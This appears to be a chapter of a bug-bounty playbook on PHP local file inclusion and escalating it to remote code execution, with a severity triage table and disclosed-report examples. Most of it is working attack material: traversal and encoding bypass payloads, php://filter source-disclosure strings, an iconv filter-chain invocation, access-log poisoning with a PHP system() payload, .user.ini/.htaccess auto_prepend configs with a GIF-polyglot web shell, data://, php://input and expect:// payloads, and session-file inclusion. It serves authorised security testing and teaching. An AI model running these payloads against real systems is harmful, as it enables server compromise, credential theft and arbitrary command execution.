## 23. LFI / FILE INCLUSION -> RCE  📂
> A reflected "path" parameter that returns `/etc/passwd` is **not** the bug — read-only LFI is usually Medium at best and frequently downgraded to Info. The payable finding is the **escalation**: source disclosure that hands you DB creds / a JWT signing key, or a deterministic path to code execution (filter-chain, log poisoning, `.user.ini`). Always ask: "can I turn this file read into RCE or a secret that takes over an account RIGHT NOW?"

### Root Cause
```php
// VULNERABLE — user-controlled string flows into include/require
$page = $_GET['page'];
include("pages/" . $page . ".php");   // ?page=../../../../etc/passwd%00
require($_GET['template']);            // ?template=php://filter/...  or http://attacker/

// VULNERABLE — file read sink (download/preview), no include but still arbitrary read
readfile($_GET['file']);              // ?file=../../../../etc/passwd
echo file_get_contents($_GET['doc']); // ?doc=/proc/self/environ

// SECURE — allowlist + basename, no traversal, no wrappers
$allowed = ['home','about','contact'];
if (!in_array($_GET['page'], $allowed, true)) abort(404);
include("pages/" . $_GET['page'] . ".php");
```
> `include`/`require`/`include_once` = code **executes** if the included content is PHP -> RCE path. `readfile`/`file_get_contents`/`fopen` = file **read** only -> source/secret disclosure (still chainable). Identify which sink you hit first — it decides your ceiling.

### Detection
High-frequency vulnerable params (downloads, previews, templating, log viewers):
```
file, filename, filepath, path, page, template, tpl, include, doc, view,
read, load, src, url, dir, folder, resource, name, lang, theme, pdf, log
```
```bash
# Baseline traversal — confirm read primitive on Linux + Windows
?file=../../../../../../etc/passwd          # root:x:0:0 in body = LFI confirmed
?file=..\..\..\..\..\..\windows\win.ini     # [fonts]/[extensions] = Windows LFI
?file=/etc/passwd                           # absolute path (no traversal needed)
?file=file:///etc/passwd                    # file:// wrapper variant

# Is the sink include() (code exec) or readfile() (read only)?
?page=php://filter/convert.base64-encode/resource=index   # base64 blob back = include()+wrappers live
?page=/etc/passwd                                          # raw passwd rendered = include() w/o ext append

# ffuf the traversal depth + encoding quickly
ffuf -u "https://target/view?file=FUZZ" -w traversal-payloads.txt -mr "root:x:0:0"
```
Signals that an LFI is actually RCE-able (chase these): PHP `X-Powered-By`/`.php` URLs (filter chain + wrappers), reachable `access.log` (log poison), an upload feature on the same host (`.user.ini`/`.htaccess` + image polyglot), `session.upload_progress` or readable `sess_*` files (session inclusion).

### Escalation to RCE
**A. `php://filter` base64 read — source/secret disclosure (always try first).**
Even when the sink appends `.php` (so you can't read `/etc/passwd`), the filter wrapper still pulls source because it operates on the stream, not the filename. This is the highest-probability win — leaks `config.php`, `wp-config.php`, `.env`-style creds, JWT keys.
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../includes/db.php
```
```python
import base64
print(base64.b64decode(blob).decode())   # decode the returned base64 to get clean source
```

**B. `php://filter` convert (iconv) chain — RCE with NO file upload.**
By chaining `convert.iconv.*` encodings with `base64-decode`/`base64-encode`, you generate **arbitrary executable PHP entirely inside the wrapper string** and feed it to `include`. No writable directory, no upload, no log file needed — works on locked-down hosts where every other vector is dead. This is the modern go-to and turns a "read-only-looking" include into clean RCE.
```bash
# Generate the chain (synacktiv tool — clone it first, it isn't a system package):
#   git clone https://github.com/synacktiv/php_filter_chain_generator.git && cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# -> ?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp
# then: &c=id   -> command output in response
```
> Requires the sink to be `include`/`require` (code execution), not `readfile`. If it's include and `php://filter` is reachable, you almost certainly have RCE — submit it as Critical with the `system()` PoC, not as "info disclosure".

**C. Log poisoning -> include access.log.** Inject PHP into a header the web server logs (`User-Agent` is unsanitised), then include the log so the include() sink executes it.
```bash
# 1. Poison — payload lands in the access log
curl -A '<?php system($_GET["c"]); ?>' https://target.com/
# 2. Include the log via the LFI, pass the command
?page=/var/log/apache2/access.log&c=id
?page=/var/log/nginx/access.log&c=id
?page=/var/log/httpd/access_log&c=id           # RHEL/CentOS
?page=C:\xampp\apache\logs\access.log&c=id     # XAMPP/Windows
# Other poisonable sinks: auth.log (SSH user="<?php..."), mail log, vsftpd log
```

**D. `.user.ini` / `.htaccess` auto_prepend (needs an upload that lands beside the LFI/exec dir).** Upload a config that forces the server to auto-include your image-polyglot shell into every PHP request in that directory — no LFI param even required once it lands.
```ini
; .user.ini (PHP-FPM/CGI) — auto-includes shell on every .php hit in this dir
auto_prepend_file=shell.gif
```
```apache
# .htaccess (Apache) — make .gif execute as PHP, or auto-prepend
AddType application/x-httpd-php .gif
php_value auto_prepend_file shell.gif
```
```php
# shell.gif — GIF magic bytes pass image checks, PHP runs on include
GIF89a<?php system($_GET['c']); ?>
```

**E. `data://` and `expect://` wrappers (need `allow_url_include=On`).**
```bash
# data:// — ship PHP inline, no file on disk
?page=data://text/plain,<?php system($_GET['c']);?>&c=id
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
# php://input — POST body becomes the included code
curl "https://target/?page=php://input" --data '<?php system("id");?>'
# expect:// — direct command exec (rare, expect extension must be loaded)
?page=expect://id
```

**F. Session file inclusion.** If you can write attacker data into your own session (any field reflected into `$_SESSION`) and know the save path, include the session file to execute it.
```bash
# Put PHP into a session value (e.g. a username/profile field), then:
?page=/var/lib/php/sessions/sess_<YOUR_PHPSESSID>&c=id
?page=/tmp/sess_<YOUR_PHPSESSID>&c=id
# session.upload_progress variant: control sess content via multipart upload while LFI races it
```

**G. `/proc/self/environ` (legacy, often patched but free to test).** The Apache/CGI process env contains your `User-Agent` — include it to execute injected PHP.
```bash
?page=/proc/self/environ   # with header: User-Agent: <?php system($_GET['c']);?>
?page=/proc/self/fd/<n>    # brute fd numbers — some point at the open access.log handle
?page=/proc/self/cmdline   # process args (read-only, recon)
```

### Bypass Techniques
Traversal filters (naive `str_replace('../','')`, extension append, basename) fall to these:

| Technique | Payload | Why it works |
|---|---|---|
| URL-encode dots/slash | `%2e%2e%2f` / `..%2f` / `%2e%2e/` | Filter matches literal `../`, not encoded form |
| Double URL-encode | `%252e%252e%252f` -> `../` | Outer layer survives a single decode pass, decodes server-side |
| Nested/self-referencing | `....//` / `..././` / `....\/` | `str_replace('../','')` removes the inner `../`, leaving a valid `../` |
| Backslash (Windows/parser) | `..\..\..\` / `....\\` | Parsers normalise `\` to `/` after the filter ran |
| Unicode / overlong UTF-8 | `%c0%ae%c0%ae%c0%af` | Overlong-encoded `.`/`/` (Tomcat/GlassFish/old parsers) |
| Full-width / homoglyph | `。。/` (U+FF0E / U+3002) | Some sanitisers miss non-ASCII dot variants |
| Null byte (legacy) | `....//etc/passwd%00.png` | PHP < 5.3.4 / old Java truncate at `%00`, drop the appended ext |
| Question-mark truncate | `../../WEB-INF/web.xml%3f` | Some readers treat `?` as query start, drop suffix |
| Wrapper, not traversal | `php://filter/.../resource=config.php` | Skips path filters entirely — reads source even with `.php` append |
| Path-prefix anchor | start with the app's own base dir then break out | Defeats `startswith(base_dir)` checks that don't `realpath()` |

### Real Paid Examples
- **GSA "Limited LFI"** — disclosed on HackerOne (report 895972): file-read primitive on a government asset; classic traversal-confined LFI, shows how even a *limited* read gets accepted when it surfaces non-public files.
- **Concrete CMS "Local File Inclusion path bypass"** — disclosed on HackerOne (report 147570): traversal filter defeated by encoding/path tricks to reach files outside the intended directory.
- **Internet Bug Bounty "Path traversal and file..."** — disclosed on HackerOne (report 1394916): library-level traversal feeding a downstream file sink; the kind of dependency bug that pays across many programs at once.
- **Source disclosure -> creds chain** — pattern seen across HackerOne file-reading reports: `php://filter` base64-reads `config.php`/`.env`, leaked DB or signing creds escalate to ATO/data access. The disclosure alone is mid-tier; the chain is what pays.
- **php://filter iconv chain -> RCE** — pattern published by synacktiv and widely reproduced in PHP bug bounty programs: an `include()` LFI with no upload turned into command execution via filter chaining (no file written to disk).

### Chain Escalation
```
LFI (read-only, readfile sink) alone                                   Low/Info — often N/A
LFI + /etc/passwd or win.ini only (no secrets, no exec)                Low/Medium — needs a chain
php://filter base64 -> config.php / wp-config.php -> DB creds          High (chain to data/ATO)
php://filter base64 -> framework SECRET_KEY / JWT signing key          Critical (forge admin session — see JWT / error-disclosure classes)
include() + php://filter iconv chain (no upload)                       Critical (RCE, system() PoC)
LFI + poisonable access.log -> include -> code exec                    Critical (RCE)
Upload + .user.ini / .htaccess auto_prepend + image polyglot           Critical (RCE — see File Upload class)
LFI + data:// or expect:// (allow_url_include=On)                      Critical (RCE)
LFI of session file you control                                        Critical (RCE)
LFI read of source -> reveals a harder bug (SQLi/SSRF/auth flaw)       upgrade per the second bug — source is the multiplier
```
> Cross-references: source disclosure feeds the **Error Disclosure / Debug Endpoints** and **JWT / API Misconfiguration** classes (leaked keys -> forge tokens); upload-assisted variants overlap the **File Upload** class (`.user.ini`, polyglot magic bytes); `file://`/`expect://` wrapper reasoning mirrors the **SSRF** class. Triage rule: a bare read-only LFI with no secret and no exec path is usually **N/A** — kill it fast unless you can name the file it unlocks.

